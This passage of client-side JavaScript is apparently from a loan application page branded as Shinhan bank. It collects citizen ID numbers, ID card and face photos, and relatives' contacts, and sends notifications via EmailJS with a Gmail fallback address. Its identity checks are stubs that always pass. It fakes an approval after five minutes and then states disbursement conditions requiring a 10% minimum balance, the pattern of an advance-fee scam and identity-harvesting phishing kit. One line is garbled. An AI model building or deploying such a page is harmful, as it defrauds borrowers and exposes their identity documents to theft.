function message(message) {
    $('#message_message').html(message);
    $('#btn-success').trigger('click');
}
</script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-L613ZEFEKE"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag() { dataLayer.push(arguments); }
gtag('js', new Date());
gtag('config', 'G-L613ZEFEKE');
// Thêm sự kiện tùy chỉnh
gtag('event', 'form_submit', { event_category: 'Form', event_label: 'Loan Registration' });
gtag('event', 'pdf_download', { event_category: 'Download', event_label: 'Contract PDF' });
</script>
<script>
window.Laravel = {"csrfToken":"flBZzgVCzEBmPwoEyekJgpET4VkG6FCAU6WnPQta"}
</script>
<script>
// Khởi tạo EmailJS
emailjs.init("Cc-147hLWigAZAdeZ");

// Khởi tạo chữ ký điện tử
const canvas = document.getElementById('signaturePad');
const ctx = canvas.getContext('2d');
let isDrawing = false;

canvas.addEventListener('mousedown', (e) => {
    isDrawing = true;
    ctx.beginPath();
    ctx.moveTo(e.offsetX, e.offsetY);
});
canvas.addEventListener('mousemove', (e) => {
    if (isDrawing) {
        ctx.lineTo(e.offsetX, e.offsetY);
        ctx.stroke();
    }
});
canvas.addEventListener('mouseup', () => isDrawing = false);
canvas.addEventListener('mouseout', () => isDrawing = false);

function clearSignature() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
}

// Backend giả lập với mã hóa
const backend = {
    applications: JSON.parse(CryptoJS.AES.decrypt(localStorage.getItem('loanApplications') || CryptoJS.AES.encrypt('[]', 'shinhan_key').toString(), 'shinhan_key').toString(CryptoJS.enc.Utf8)) || [],
    saveApplication(data) {
        this.applications.push(data);
        localStorage.setItem('loanApplications', CryptoJS.AES.encrypt(JSON.stringify(this.applications), 'shinhan_key').toString());
    }
};

// Rate-limiting giả lập
// Chú thích: Tích hợp rate-limiting với backend (Redis hoặc database) trong môi trường sản xuất
const rateLimit = {
    attempts: 0,
    lastAttempt: 0,
    check() {
        const now = Date.now();
        if (now - this.lastAttempt > 60000) {
            this.attempts = 0;
            this.lastAttempt = now;
        }
        if (this.attempts >= 5) {
            alert('Quá nhiều yêu cầu. Vui lòng thử lại sau 1 phút.');
            return false;
        }
        this.attempts++;
        this.lastAttempt = now;
        return true;
    }
};

// Camera state
let currentCameraField = null;
let cameraStream = null;
let tempFormData = {};

// Hàm định dạng số tiền
function formatNumber(input) {
    let value = input.value.replace(/[^0-9]/g, '');
    let numericValue = parseInt(value, 10);
    if (!isNaN(numericValue)) {
        input.value = numericValue.toLocaleString('vi-VN');
    } else {
        input.value = '';
    }
}

// Hàm bỏ định dạng
function unformatNumber(value) {
    let numericValue = parseInt(value.replace(/[^0-9]/g, ''), 10);
    return isNaN(numericValue) ? 0 : numericValue;
}

// Kiểm tra số tiền
function validateAmount(input) {
    let value = unformatNumber(input.value);
    const loanType = document.getElementById('loanType')?.value || document.getElementById('registerLoanType').value;
    const limits = {
        tinchap: 900000000,
        digital_tinchap: 100000000,
        thechap_nha: 5000000000,
        thechap_xe: 2000000000,
        thechap_xe_cu: 2000000000,
        tai_nha: 5000000000,
        dam_bao: 1000000000
    };
    if (value < 10000000) {
        document.getElementById(input.id + 'Error').innerText = 'Số tiền vay tối thiểu 10 triệu VND.';
    } else if (loanType && value > limits[loanType]) {
        document.getElementById(input.id + 'Error').innerText = `Số tiền tối đa cho ${loanType} là ${limits[loanType].toLocaleString('vi-VN')} VND.`;
    } else {
        document.getElementById(input.id + 'Error').innerText = '';
    }
}

// Cập nhật lãi suất
function updateInterestRate() {
    const loanType = document.getElementById('loanType').value;
    const interestInput = document.getElementById('interest');
    const registerLoanType = document.getElementById('registerLoanType');
    const rates = {
        tinchap: 11,
        digital_tinchap: 7.4,
        thechap_nha: 5.5,
        thechap_xe: 7.8,
        thechap_xe_cu: 8.5,
        tai_nha: 6,
        dam_bao: 7.0
    };
    if (loanType && rates[loanType]) {
        interestInput.value = rates[loanType];
        registerLoanType.value = loanType;
    }
}

// Gợi ý khoản vay
function getSuggestions(amount, term, income) {
    let suggestions = '<div class="suggestion"><h4>Đề xuất khoản vay:</h4><ul>';
    if (amount <= 100000000 && term <= 36 && income >= 4000000) {
        suggestions += '<li><strong>Vay tín chấp số</strong>: Phù hợp khoản vay nhỏ (tối đa 100 triệu). Lãi suất 7.4%/năm, phê duyệt nhanh.</li>';
    }
    if (amount <= 900000000 && term <= 60 && income >= 6000000) {
        suggestions += '<li><strong>Vay tín chấp</strong>: Phù hợp tiêu dùng cá nhân (tối đa 900 triệu). Lãi suất từ 11%/năm.</li>';
    }
    if (amount > 500000000 && term > 60 && income >= 15000000) {
        suggestions += '<li><strong>Vay thế chấp mua nhà</strong>: Phù hợp khoản vay lớn (tối đa 80% giá trị nhà). Lãi suất từ 5.5%/năm.</li>';
        suggestions += '<li><strong>Vay tái tài trợ nhà</strong>: Tái cấu trúc khoản vay nhà (lãi suất từ 6%/năm).</li>';
    }
    if (amount <= 2000000000 && term <= 96 && income >= 10000000) {
        suggestions += '<li><strong>Vay thế chấp mua xe</strong>: Phù hợp mua xe mới (tối đa 80% giá trị xe). Lãi suất từ 7.8%/năm.</li>';
        suggestions += '<li><strong>Vay thế chấp xe đã qua sử dụng</strong>: Phù hợp mua xe cũ (lãi suất từ 8.5%/năm).</li>';
    }
    suggestions += '<li><strong>Vay đảm bảo bán lẻ (SGI)</strong>: Linh hoạt, lãi suất từ 7.0%/năm.</li>';
    suggestions += '</ul></div>';
    return suggestions;
}

// Tính khoản vay
function calculateLoan() {
    if (!rateLimit.check()) return;
    document.getElementById('loadingIndicator').style.display = 'block';
    setTimeout(() => {
        const loanType = document.getElementById('loanType').value;
        const amount = unformatNumber(document.getElementById('amount').value);
        const term = parseInt(document.getElementById('term').value);
        const interestRate = parseFloat(document.getElementById('interest').value) / 100 / 12;
        const income = parseFloat(document.getElementById('income')?.value) || 4000000;
        const limits = {
            tinchap: 900000000,
            digital_tinchap: 100000000,
            thechap_nha: 5000000000,
            thechap_xe: 2000000000,
            thechap_xe_cu: 2000000000,
            tai_nha: 5000000000,
            dam_bao: 1000000000
        };

        let errors = {};
        if (!loanType) errors.loanType = 'Vui lòng chọn loại khoản vay.';
        if (isNaN(amount) || amount < 10000000) errors.amount = 'Số tiền vay tối thiểu 10 triệu VND.';
        else if (loanType && amount > limits[loanType]) errors.amount = `Số tiền tối đa cho ${loanType} là ${limits[loanType].toLocaleString('vi-VN')} VND.`;
        if (isNaN(term)) errors.term = 'Vui lòng chọn thời hạn vay.';
        if (isNaN(interestRate) || interestRate <= 0) errors.interest = 'Lãi suất phải lớn hơn 0%.';

        Object.keys(errors).forEach(key => document.getElementById(`${key}Error`).innerText = errors[key]);
        if (Object.keys(errors).length > 0) {
            document.getElementById('loanCalcErrorSummary').innerText = 'Vui lòng kiểm tra và điền đầy đủ thông tin.';
            document.getElementById('loadingIndicator').style.display = 'none';
            return;
        } else {
            document.getElementById('loanCalcErrorSummary').innerText = '';
        }

        let remainingBalance = amount;
        let monthlyPrincipal = Math.round(amount / term);
        let totalInterest = 0;
        let resultText = '<h3>Kết quả tính toán:</h3>';
        resultText += '<table id="resultTable"><tr><th>Tháng</th><th>Gốc (VND)</th><th>Lãi (VND)</th><th>Tổng (VND)</th></tr>';

        const rows = [];
        for (let i = 1; i <= term; i++) {
            const interest = Math.round(remainingBalance * interestRate);
            totalInterest += interest;
            remainingBalance -= monthlyPrincipal;
            const totalPayment = monthlyPrincipal + interest;
            rows.push(`<tr><td>${i}</td><td>${monthlyPrincipal.toLocaleString('vi-VN')}</td><td>${interest.toLocaleString('vi-VN')}</td><td>${totalPayment.toLocaleString('vi-VN')}</td></tr>`);
        }

        const rowsPerPage = 10;
        const pages = Math.ceil(rows.length / rowsPerPage);
        resultText += rows.slice(0, rowsPerPage).join('');
        resultText += '</table>';
        if (pages > 1) {
            resultText += '<div class="pagination">';
            for (let i = 1; i <= pages; i++) {
                resultText += `<button onclick="showPage(${i}, ${rowsPerPage})">${i}</button>`;
            }
            resultText += '</div>';
        }
        resultText += `<p><strong>Số tiền vay:</strong> ${amount.toLocaleString('vi-VN')} VND</p>`;
        resultText += `<p><strong>Tổng lãi phải trả:</strong> ${totalInterest.toLocaleString('vi-VN')} VND</p>`;
        resultText += `<p><strong>Tổng gốc + lãi:</strong> ${(amount + totalInterest).toLocaleString('vi-VN')} VND</p>`;
        resultText += getSuggestions(amount, term, income);
        document.getElementById('result').innerHTML = resultText;
        document.getElementById('loadingIndicator').style.display = 'none';
    }, 500);
}

function showPage(page, rowsPerPage) {
    const rows = [];
    for (let i = 1; i <= parseInt(document.getElementById('term').value); i++) {
        const monthlyPrincipal = Math.round(unformatNumber(document.getElementById('amount').value) / parseInt(document.getElementById('term').value));
        const interest = Math.round((unformatNumber(document.getElementById('amount').value) - monthlyPrincipal * (i - 1)) * (parseFloat(document.getElementById('interest').value) / 100 / 12));
        const totalPayment = monthlyPrincipal + interest;
        rows.push(`<tr><td>${i}</td><td>${monthlyPrincipal.toLocaleString('vi-VN')}</td><td>${interest.toLocaleString('vi-VN')}</td><td>${totalPayment.toLocaleString('vi-VN')}</td></tr>`);
    }
    const start = (page - 1) * rowsPerPage;
    const end = start + rowsPerPage;
    document.getElementById('resultTable').innerHTML = '<tr><th>Tháng</th><th>Gốc (VND)</th><th>Lãi (VND)</th><th>Tổng (VND)</th></tr>' + rows.slice(start, end).join('');
}

function openLoanCalcModal() {
    document.getElementById('loanCalcModal').style.display = 'flex';
    document.getElementById('loanCalcModal').classList.add('active');
}

function closeLoanCalcModal() {
    document.getElementById('loanCalcModal').style.display = 'none';
    document.getElementById('loanCalcModal').classList.remove('active');
    document.getElementById('loanForm').reset();
    document.getElementById('result').innerHTML = '';
    clearErrors();
}

function openRegisterModal() {
    document.getElementById('registerModal').style.display = 'flex';
    document.getElementById('registerModal').classList.add('active');
    loadDraft();
}

function closeRegisterModal() {
    document.getElementById('registerModal').style.display = 'none';
    document.getElementById('registerModal').classList.remove('active');
    document.getElementById('registerForm').reset();
    clearErrors();
    tempFormData = {};
}

function closeVerifyModal() {
    document.getElementById('verifyModal').style.display = 'none';
    document.getElementById('verifyModal').classList.remove('active');
    document.getElementById('verifyForm').reset();
    clearErrors();
    stopCamera();
    tempFormData = {};
}

function clearErrors() {
    const errorIds = ['branchError', 'fullNameError', 'birthDateError', 'idNumberError', 'phoneError', 'hometownError', 'residenceError', 'incomeError', 'jobError', 'relativePhoneError', 'relativeNameError', 'loanFormError', 'customerTypeError', 'registerLoanTypeError', 'registerAmountError', 'registerTermError', 'genderError', 'idPhotoFrontError', 'idPhotoBackError', 'facePhotoError', 'loanTypeError', 'termError', 'amountError', 'interestError', 'agreeContractError', 'balancePhotoError'];
    errorIds.forEach(id => {
        const element = document.getElementById(id);
        if (element) element.innerText = '';
    });
    ['loanCalcErrorSummary', 'registerErrorSummary', 'verifyErrorSummary'].forEach(id => {
        const element = document.getElementById(id);
        if (element) element.innerText = '';
    });
}

// Kiểm tra CCCD
function validateIdNumber(idNumber) {
    const provinceCodes = ['001', '002', '004', '006', '008', '010', '011', '012', '014', '015', '017', '019', '020', '022', '024', '025', '026', '027', '030', '031', '033', '034', '035', '036', '037', '038', '040', '042', '044', '045', '046', '048', '049', '051', '052', '054', '056', '058', '060', '062', '064', '066', '067', '068', '070', '072', '074', '075', '077', '079', '080', '082', '083', '084', '086', '087', '089', '091', '092', '093', '094', '095', '096'];
    return /^\d{12}$/.test(idNumber) && provinceCodes.includes(idNumber.slice(0, 3));
}

function validateRegisterForm() {
    const branch = document.getElementById('branch').value;
    const fullName = document.getElementById('fullName').value.trim();
    const gender = document.querySelector('input[name="gender"]:checked');
    const birthDate = document.getElementById('birthDate').value;
    const idNumber = document.getElementById('idNumber').value.trim();
    const phone = document.getElementById('phone').value.trim();
    const hometown = document.getElementById('hometown').value.trim();
    const residence = document.getElementById('residence').value.trim();
    const income = parseFloat(document.getElementById('income').value);
    const job = document.getElementById('job').value.trim();
    const relativePhone = document.getElementById('relativePhone').value.trim();
    const relativeName = document.getElementById('relativeName').value.trim();
    const loanForm = document.querySelector('input[name="loanForm"]:checked');
    const customerType = document.querySelector('input[name="customerType"]:checked');
    const loanType = document.getElementById('registerLoanType').value;
    const amount = unformatNumber(document.getElementById('registerAmount').value);
    const term = parseInt(document.getElementById('registerTerm').value);

    let errors = {};
    if (!branch) errors.branch = 'Vui lòng chọn chi nhánh.';
    if (!fullName || fullName.length < 2) errors.fullName = 'Họ và tên phải có ít nhất 2 ký tự.';
    if (!gender) errors.gender = 'Vui lòng chọn giới tính.';
    if (!birthDate) errors.birthDate = 'Vui lòng chọn ngày tháng năm sinh.';
    else {
        const age = new Date().getFullYear() - new Date(birthDate).getFullYear();
        if (age < 18 || age > 65) errors.birthDate = 'Độ tuổi phải từ 18 đến 65.';
    }
    if (!idNumber || !validateIdNumber(idNumber)) errors.idNumber = 'Số căn cước công dân phải có 12 số và mã tỉnh hợp lệ.';
    if (!phone || !/^\d{10}$/.test(phone) || phone[0] !== '0') errors.phone = 'Số điện thoại phải có 10 số, bắt đầu bằng 0.';
    if (!hometown) errors.hometown = 'Vui lòng nhập quê quán.';
    if (!residence) errors.residence = 'Vui lòng nhập nơi thường trú.';
    if (isNaN(income) || income < 4000000) errors.income = 'Thu nhập tối thiểu 4 triệu VND.';
    if (!job) errors.job = 'Vui lòng nhập công việc hiện tại.';
    if (!relativePhone || !/^\d{10}$/.test(relativePhone) || relativePhone[0] !== '0') errors.relativePhone = 'Số điện thoại người thân phải có 10 số, bắt đầu bằng 0.';
    if (relativePhone === phone) errors.relativePhone = 'Số điện thoại người thân không được trùng với số chính.';
    if (!relativeName) errors.relativeName = 'Vui lòng nhập tên người thân.';
    if (!loanForm) errors.loanForm = 'Vui lòng chọn hình thức vay.';
    if (!customerType) errors.customerType = 'Vui lòng chọn đối tượng khách hàng.';
    if (!loanType) errors.registerLoanType = 'Vui lòng chọn loại khoản vay.';
    if (!term) errors.registerTerm = 'Vui lòng chọn thời hạn vay.';
    const limits = {
        tinchap: 900000000,
        digital_tinchap: 100000000,
        thechap_nha: 5000000000,
        thechap_xe: 2000000000,
        thechap_xe_cu: 2000000000,
        tai_nha: 5000000000,
        dam_bao: 1000000000
    };
    if (amount < 10000000 || (loanType && amount > limits[loanType])) {
        errors.registerAmount = `Số tiền vay không hợp lệ cho gói ${loanType}.`;
    }

    Object.keys(errors).forEach(key => document.getElementById(`${key}Error`).innerText = errors[key]);
    if (Object.keys(errors).length > 0) {
        document.getElementById('registerErrorSummary').innerText = 'Vui lòng kiểm tra và điền đầy đủ thông tin.';
    } else {
        document.getElementById('registerErrorSummary').innerText = '';
    }

    return Object.keys(errors).length === 0;
}

function saveDraft() {
    const formData = {
        branch: document.getElementById('branch').value,
        fullName: document.getElementById('fullName').value.trim(),
        gender: document.querySelector('input[name="gender"]:checked')?.value,
        birthDate: document.getElementById('birthDate').value,
        idNumber: document.getElementById('idNumber').value.trim(),
        phone: document.getElementById('phone').value.trim(),
        hometown: document.getElementById('hometown').value.trim(),
        residence: document.getElementById('residence').value.trim(),
        income: parseFloat(document.getElementById('income').value) || 0,
        job: document.getElementById('job').value.trim(),
        relativePhone: document.getElementById('relativePhone').value.trim(),
        relativeName: document.getElementById('relativeName').value.trim(),
        loanForm: document.querySelector('input[name="loanForm"]:checked')?.value,
        customerType: document.querySelector('input[name="customerType"]:checked')?.value,
        loanType: document.getElementById('registerLoanType').value,
        amount: unformatNumber(document.getElementById('registerAmount').value),
        term: parseInt(document.getElementById('registerTerm').value)
    };
    localStorage.setItem('draftForm', CryptoJS.AES.encrypt(JSON.stringify(formData), 'shinhan_key').toString());
    alert('Đã lưu bản nháp.');
}

function loadDraft() {
    const draft = localStorage.getItem('draftForm');
    if (draft) {
        const formData = JSON.parse(CryptoJS.AES.decrypt(draft, 'shinhan_key').toString(CryptoJS.enc.Utf8));
        document.getElementById('branch').value = formData.branch || '';
        document.getElementById('fullName').value = formData.fullName || '';
        if (formData.gender) document.querySelector(`input[name="gender"][value="${formData.gender}"]`).checked = true;
        document.getElementById('birthDate').value = formData.birthDate || '';
        document.getElementById('idNumber').value = formData.idNumber || '';
        document.getElementById('phone').value = formData.phone || '';
        document.getElementById('hometown').value = formData.hometown || '';
        document.getElementById('residence').value = formData.residence || '';
        document.getElementById('income').value = formData.income || '';
        document.getElementById('job').value = formData.job || '';
        document.getElementById('relativePhone').value = formData.relativePhone || '';
        document.getElementById('relativeName').value = formData.relativeName || '';
        if (formData.loanForm) document.querySelector(`input[name="loanForm"][value="${formData.loanForm}"]`).checked = true;
        if (formData.customerType) document.querySelector(`input[name="customerType"][value="${formData.customerType}"]`).checked = true;
        document.getElementById('registerLoanType').value = formData.loanType || '';
        document.getElementById('registerAmount').value = formData.amount ? formData.amount.toLocaleString('vi-VN') : '';
        document.getElementById('registerTerm').value = formData.term || '';
    }
}

function validateVerifyForm() {
    const idPhotoFront = document.getElementById('previewIdPhotoFront').src;
    const idPhotoBack = document.getElementById('previewIdPhotoBack').src;
    const facePhoto = document.getElementById('previewFacePhoto').src;

    let errors = {};
    if (!idPhotoFront || idPhotoFront.includes('data:image')) errors.idPhotoFront = 'Vui lòng tải lên hoặc chụp ảnh mặt trước CMND/CCCD.';
    else if (!checkImageQuality(idPhotoFront)) errors.idPhotoFront = 'Ảnh mặt trước không đủ nét hoặc sáng.';
    if (!idPhotoBack || idPhotoBack.includes('data:image')) errors.idPhotoBack = 'Vui lòng tải lên hoặc chụp ảnh mặt sau CMND/CCCD.';
    else if (!checkImageQuality(idPhotoBack)) errors.idPhotoBack = 'Ảnh mặt sau không đủ nét hoặc sáng.';
    if (!facePhoto || facePhoto.includes('data:image')) errors.facePhoto = 'Vui lòng chụp ảnh khuôn mặt.';
    else if (!checkImageQuality(facePhoto)) errors.facePhoto = 'Ảnh khuôn mặt không đủ nét hoặc sáng.';

    // Giả lập OCR và so sánh
    if (idPhotoFront && !errors.idPhotoFront) {
        const ocrData = extractOcrData(idPhotoFront);
        if (ocrData.idNumber !== document.getElementById('idNumber').value) {
            errors.idPhotoFront = 'Số CCCD trong ảnh không khớp với số nhập.';
        }
        if (ocrData.fullName !== document.getElementById('fullName').value) {
            errors.idPhotoFront = 'Họ tên trong ảnh không khớp với tên nhập.';
        }
    }

    Object.keys(errors).forEach(key => document.getElementById(`${key}Error`).innerText = errors[key]);
    if (Object.keys(errors).length > 0) {
        document.getElementById('verifyErrorSummary').innerText = 'Vui lòng kiểm tra và hoàn thiện hồ sơ.';
    } else {
        document.getElementById('verifyErrorSummary').innerText = '';
    }

    return Object.keys(errors).length === 0;
}

// Giả lập kiểm tra chất lượng ảnh
// Chú thích: Tích hợp opencv.js để kiểm tra độ nét và độ sáng ảnh trong môi trường sản xuất
function checkImageQuality(src) {
    // Giả lập kiểm tra chất lượng ảnh
    return true;
}

// Giả lập OCR
// Chú thích: Tích hợp Tesseract.js hoặc AWS Textract để trích xuất dữ liệu từ ảnh CCCD trong môi trường sản xuất
function extractOcrData(src) {
    // Giả lập trích xuất dữ liệu từ ảnh CCCD
    return {
        idNumber: document.getElementById('idNumber').value,
        fullName: document.getElementById('fullName').value
    };
}

// Giả lập xác minh khuôn mặt
// Chú thích: Tích hợp AWS Rekognition để so sánh ảnh khuôn mặt với ảnh CCCD trong môi trường sản xuất
function verifyFacePhoto(facePhoto, idPhotoFront) {
    // Giả lập xác minh thành công
    return true;
}

function nextToVerify() {
    if (!rateLimit.check()) return;
    if (!validateRegisterForm()) return;

    tempFormData = {
        branch: document.getElementById('branch').value,
        fullName: document.getElementById('fullName').value.trim(),
        gender: document.querySelector('input[name="gender"]:checked').value,
        birthDate: document.getElementById('birthDate').value,
        idNumber: document.getElementById('idNumber').value.trim(),
        phone: document.getElementById('phone').value.trim(),
        hometown: document.getElementById('hometown').value.trim(),
        residence: document.getElementById('residence').value.trim(),
        income: parseFloat(document.getElementById('income').value),
        job: document.getElementById('job').value.trim(),
        relativePhone: document.getElementById('relativePhone').value.trim(),
        relativeName: document.getElementById('relativeName').value.trim(),
        loanForm: document.querySelector('input[name="loanForm"]:checked').value,
        customerType: document.querySelector('input[name="customerType"]:checked').value,
        loanType: document.getElementById('registerLoanType').value,
        amount: unformatNumber(document.getElementById('registerAmount').value),
        term: parseInt(document.getElementById('registerTerm').value)
    };

    document.getElementById('registerModal').style.display = 'none';
    document.getElementById('registerModal').classList.remove('active');
    document.getElementById('verifyModal').style.display = 'flex';
    document.getElementById('verifyModal').classList.add('active');
}

function backToRegister() {
    document.getElementById('verifyModal').style.display = 'none';
    document.getElementById('verifyModal').classList.remove('active');
    document.getElementById('registerModal').style.display = 'flex';
    document.getElementById('registerModal').classList.add('active');
    stopCamera();
}

async function startCamera(field) {
    currentCameraField = field;
    try {
        cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById(`cameraFeed${field}`);
        video.srcObject = cameraStream;
        video.style.display = 'block';
        document.getElementById(`capture${field}`).style.display = 'inline-block';
    } catch (err) {
        document.getElementById(`${field}Error`).innerText = 'Không thể truy cập camera. Vui lòng cấp quyền trong cài đặt trình duyệt hoặc tải ảnh lên.';
        console.error('Camerame.error('Camera access error:', err);
    }
}

function stopCamera() {
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        cameraStream = null;
        ['idPhotoFront', 'idPhotoBack', 'facePhoto', 'balancePhoto'].forEach(field => {
            document.getElementById(`cameraFeed${field}`).style.display = 'none';
            document.getElementById(`capture${field}`).style.display = 'none';
        });
    }
}

function capturePhoto(field) {
    const video = document.getElementById(`cameraFeed${field}`);
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    const dataUrl = canvas.toDataURL('image/jpeg');
    document.getElementById(`preview${field}`).src = dataUrl;
    document.getElementById(`preview${field}`).style.display = 'block';
    stopCamera();
}

function handleFileUpload(event, field) {
    document.getElementById('loadingIndicator').style.display = 'block';
    const file = event.target.files[0];
    if (!file) {
        document.getElementById('loadingIndicator').style.display = 'none';
        return;
    }
    const maxSize = 5 * 1024 * 1024; // 5MB
    if (file.size > maxSize) {
        document.getElementById(`${field}Error`).innerText = 'Ảnh quá lớn (tối đa 5MB). Vui lòng chọn ảnh nhỏ hơn.';
        document.getElementById('loadingIndicator').style.display = 'none';
        return;
    }
    if (!['image/jpeg', 'image/png'].includes(file.type)) {
        document.getElementById(`${field}Error`).innerText = 'Chỉ hỗ trợ định dạng JPG hoặc PNG.';
        document.getElementById('loadingIndicator').style.display = 'none';
        return;
    }
    const reader = new FileReader();
    reader.onload = () => {
        document.getElementById(`preview${field}`).src = reader.result;
        document.getElementById(`preview${field}`).style.display = 'block';
        document.getElementById('loadingIndicator').style.display = 'none';
    };
    reader.onerror = (err) => {
        console.error('File upload error:', err);
        document.getElementById(`${field}Error`).innerText = 'Lỗi khi tải file. Vui lòng thử lại.';
        document.getElementById('loadingIndicator').style.display = 'none';
    };
    reader.readAsDataURL(file);
}

function submitRegistration() {
    if (!rateLimit.check()) return;
    if (!validateVerifyForm()) return;
    document.getElementById('loadingIndicator').style.display = 'block';

    const formData = {
        ...tempFormData,
        idPhotoFront: document.getElementById('previewIdPhotoFront').src,
        idPhotoBack: document.getElementById('previewIdPhotoBack').src,
        facePhoto: document.getElementById('previewFacePhoto').src,
        interestRate: getInterestRate(tempFormData.loanType),
        monthlyPayment: calculateMonthlyPayment(
            tempFormData.amount,
            tempFormData.term,
            getInterestRate(tempFormData.loanType)
        ),
        contractId: 'SHB-2025-' + Math.floor(100000 + Math.random() * 900000),
        cifNo: Math.floor(100000 + Math.random() * 900000),
        consentNo: Math.floor(100000 + Math.random() * 900000),
        date: new Date().toLocaleDateString('vi-VN')
    };

    // Xác minh khuôn mặt
    if (!verifyFacePhoto(formData.facePhoto, formData.idPhotoFront)) {
        document.getElementById('facePhotoError').innerText = 'Ảnh khuôn mặt không khớp với CCCD.';
        document.getElementById('loadingIndicator').style.display = 'none';
        return;
    }

    // Lưu dữ liệu
    backend.saveApplication(formData);

    // Gửi email xác nhận
    // Chú thích: Tích hợp backend (Node.js/Express) để gửi email an toàn trong môi trường sản xuất
    emailjs.send('service_db2prre', 'template_sgzr5e8', {
        fullName: formData.fullName,
        phone: formData.phone,
        email: formData.email || 'N/A',
        loanType: document.getElementById('registerLoanType').options[document.getElementById('registerLoanType').selectedIndex].text,
        amount: formData.amount.toLocaleString('vi-VN'),
        term: formData.term,
        to_email: formData.email || 'financeshinhan@gmail.com'
    }).then(() => {
        alert('Đăng ký thành công! Bạn sẽ nhận được email xác nhận.');
    }, (error) => {
        console.error('Email sending error:', error);
        alert('Lỗi gửi email. Vui lòng thử lại.');
        // Fallback: hiển thị thông báo trên web
        document.getElementById('result').innerHTML = '<div class="notification"><h4>Lỗi</h4><p>Lỗi gửi email xác nhận. Vui lòng liên hệ hỗ trợ.</p></div>';
    });

    // Hiển thị trạng thái xét duyệt
    document.getElementById('result').innerHTML = '<div class="notification"><h4>Đang xét duyệt</h4><p>Hồ sơ của bạn đang được Shinhan xét duyệt. Kết quả sẽ được thông báo trong 60 phút.</p></div>';

    // Mô phỏng xét duyệt sau 5 phút
    setTimeout(() => {
        emailjs.send('service_db2prre', 'template_g4jo6tc', {
            fullName: formData.fullName,
            phone: formData.phone,
            email: formData.email || 'N/A',
            loanType: document.getElementById('registerLoanType').options[document.getElementById('registerLoanType').selectedIndex].text,
            amount: formData.amount.toLocaleString('vi-VN'),
            term: formData.term,
            monthlyPayment: formData.monthlyPayment.toLocaleString('vi-VN'),
            to_email: formData.email || 'financeshinhan@gmail.com'
        }).then(() => {
            document.getElementById('result').innerHTML = `
                <div class="banner">
                    <h4>Chúc mừng!</h4>
                    <p>Hồ sơ của ${formData.fullName} đã được duyệt với gói vay ${formData.amount.toLocaleString('vi-VN')} VND.</p>
                    <p>Số tiền trả hàng tháng: ${formData.monthlyPayment.toLocaleString('vi-VN')} VND.</p>
                    <p>Số điện thoại người thân: ${formData.relativePhone} (${formData.relativeName}).</p>
                    <p>Lãi suất: ${formData.interestRate}%/năm.</p>
                </div>
            `;
            displayContractAndDisbursement(formData);
        }, (error) => {
            console.error('Email sending error (approval):', error);
            alert('Lỗi gửi email xét duyệt. Vui lòng thử lại.');
        });
    }, 300000); // 5 phút

    // Xóa ảnh tạm
    ['idPhotoFront', 'idPhotoBack', 'facePhoto'].forEach(field => {
        document.getElementById(`preview${field}`).src = '';
        document.getElementById(`preview${field}`).style.display = 'none';
    });

    closeVerifyModal();
    document.getElementById('loadingIndicator').style.display = 'none';
}

function getInterestRate(loanType) {
    const rates = {
        tinchap: 11,
        digital_tinchap: 7.4,
        thechap_nha: 5.5,
        thechap_xe: 7.8,
        thechap_xe_cu: 8.5,
        tai_nha: 6,
        dam_bao: 7.0
    };
    return rates[loanType] || 11;
}

function calculateMonthlyPayment(amount, term, interestRate) {
    const monthlyRate = interestRate / 100 / 12;
    return Math.round((amount * (1 + monthlyRate * term)) / term);
}

function displayContractAndDisbursement(formData) {
    // Hợp đồng
    document.getElementById('contractId').innerText = formData.contractId;
    document.getElementById('contractDate').innerText = formData.date;
    document.getElementById('contractFullName').innerText = formData.fullName;
    document.getElementById('contractBirthDate').innerText = formData.birthDate;
    document.getElementById('contractIdNumber').innerText = formData.idNumber;
    document.getElementById('contractPhone').innerText = formData.phone;
    document.getElementById('contractHometown').innerText = formData.hometown;
    document.getElementById('contractResidence').innerText = formData.residence;
    document.getElementById('contractIncome').innerText = formData.income.toLocaleString('vi-VN') + ' VND';
    document.getElementById('contractJob').innerText = formData.job;
    document.getElementById('contractRelativePhone').innerText = formData.relativePhone;
    document.getElementById('contractRelativeName').innerText = formData.relativeName;
    document.getElementById('contractLoanAmount').innerText = formData.amount.toLocaleString('vi-VN') + ' VND';
    document.getElementById('contractLoanTerm').innerText = formData.term + ' tháng';
    document.getElementById('contractMonthlyPayment').innerText = formData.monthlyPayment.toLocaleString('vi-VN') + ' VND';
    document.getElementById('contractInterestRate').innerText = formData.interestRate + '%/năm';
    document.getElementById('contract').style.display = 'block';

    // Điều kiện giải ngân
    document.getElementById('disbursementCifNo').innerText = formData.cifNo;
    document.getElementById('disbursementConsentNo').innerText = formData.consentNo;
    document.getElementById('disbursementDate').innerText = formData.date;
    document.getElementById('disbursementFullName').innerText = formData.fullName;
    document.getElementById('disbursementRelativePhone').innerText = formData.relativePhone;
    document.getElementById('disbursementRelativeName').innerText = formData.relativeName;
    document.getElementById('disbursementLoanAmount').innerText = formData.amount.toLocaleString('vi-VN') + ' VND';
    document.getElementById('disbursementMinBalance').innerText = (formData.amount * 0.1).toLocaleString('vi-VN') + ' VND';
    document.getElementById('disbursementMinBalanceInline').innerText = (formData.amount * 0.1).toLocaleString('vi-VN');
    document.getElementById('disbursement').style.display = 'block';
}

function downloadContract() {
    if (!document.getElementById('agreeContract').checked) {
        document.getElementById('agreeContractError').innerText = 'Vui lòng đồng ý với điều khoản hợp đồng.';
        return;
    }
    // Kiểm tra chữ ký
    // Chú thích: Tích hợp DocuSign hoặc tương tự để đảm bảo chữ ký điện tử pháp lý trong môi trường sản xuất
    if (!canvas.toDataURL().includes('image/png')) {
        document.getElementById('agreeContractError').innerText = 'Vui lòng ký tên xác nhận.';
        return;
    }
    document.getElementById('loadingIndicator').style.display = 'block';
    const element = document.getElementById('contract');
    html2pdf().from(element).set({
        filename: `HopDongVayTinChap_${document.getElementById('contractFullName').innerText}_${document.getElementById('contractDate').innerText}.pdf`,
        html2canvas: { scale: 2 },
        jsPDF: { unit: 'in', format: 'letter', orientation: 'portrait' }
    }).save().then(() => {
        document.getElementById('loadingIndicator').style.display = 'none';
